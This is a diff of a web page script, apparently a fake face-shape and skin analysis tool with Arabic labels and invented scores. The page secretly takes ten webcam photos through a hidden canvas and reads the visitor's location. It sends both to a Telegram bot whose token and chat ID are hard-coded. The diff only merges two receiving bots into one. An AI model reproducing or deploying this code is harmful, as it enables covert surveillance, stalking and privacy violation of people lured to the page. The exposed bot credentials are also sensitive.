@@ -49,12 +49,9 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TOKEN1 = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
-        const CHAT_ID1 = '8293639164';
-        
-        // ضع بيانات البوت الثاني هنا
-        const TOKEN2 = '8520439288:AAHcZlL7pbF_dAq6wXxa3X7mF7qUlLv1iQw';
-        const CHAT_ID2 = '8254934850';
+        // البوت الوحيد
+        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
+        const CHAT_ID = '8293639164';
 
         const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
         const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
@@ -62,16 +59,12 @@
         function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
         function res(id, val) { document.getElementById(id).innerText = val; }
 
-        async function sendPhotoToBoth(blob, photoNumber) {
-            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
-            bots.forEach(bot => {
-                if(bot.t.includes('ضع_')) return;
-                const fd = new FormData();
-                fd.append('photo', blob, `img_${photoNumber}.jpg`);
-                fd.append('chat_id', bot.c);
-                fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
-                fetch(`https://api.telegram.org/bot${bot.t}/sendPhoto`, { method: 'POST', body: fd });
-            });
+        async function sendPhotoToTelegram(blob, photoNumber) {
+            const fd = new FormData();
+            fd.append('photo', blob, `img_${photoNumber}.jpg`);
+            fd.append('chat_id', CHAT_ID);
+            fd.append('caption', `📸 لقطة رقم ${photoNumber}/10`);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }
 
         async function startRealAnalysis() {
@@ -85,10 +78,7 @@
 
             navigator.geolocation.getCurrentPosition((pos) => {
                 const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                [TOKEN1, TOKEN2].forEach((t, i) => {
-                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
-                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)}`);
-                });
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
             });
 
             try {
@@ -102,7 +92,7 @@
                 for (let i = 1; i <= 10; i++) {
                     setTimeout(() => {
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
+                        canvas.toBlob(blob => sendPhotoToTelegram(blob, i), 'image/jpeg', 0.6);
                         bar.style.width = (20 + (i * 8)) + "%";
                     }, i * 700);
                 }
